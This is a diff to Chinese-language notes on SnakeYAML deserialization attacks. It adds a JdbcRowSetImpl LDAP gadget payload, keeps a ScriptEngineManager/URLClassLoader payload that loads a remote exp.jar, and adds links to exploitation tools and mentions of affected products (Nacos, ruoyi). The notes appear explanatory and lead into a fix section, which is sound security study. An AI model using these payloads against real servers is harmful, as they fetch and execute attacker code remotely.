@@ -27,6 +27,12 @@ yamlMap = yaml.load(inputStream);
 当数据是数组时候会调用构造方法，其中一条攻击链就是利用SPI机制来加载恶意类：
 使用 !!+全类名指定反序列化的类，反序列化过程中会实例化该类。snakeyaml 将全类名解析，并将类使用forname()进行加载，然后通过反射获取构造器，调用构造方法，控制适当的类的构造方法就能进行漏洞攻击。
 如
+
+
+```
+!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: ldap://127.0.0.1:1389/5cjybz, autoCommit: true}
+```
+
 ```
 !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:7788/exp.jar"]]]]
 ```
@@ -40,10 +46,12 @@ public class Snakeyaml {
     }
 }
 ```
-网上工具
+网上工具利用
 <https://www.cnblogs.com/nice0e3/p/14514882.html>
+<https://xz.aliyun.com/news/12229>
 Nacos反序列化漏洞
 <https://mp.weixin.qq.com/s/SfAFMiraMKafcISo5IDEAg>
+ruoyi也存在
 
 ^
 ## **修复**
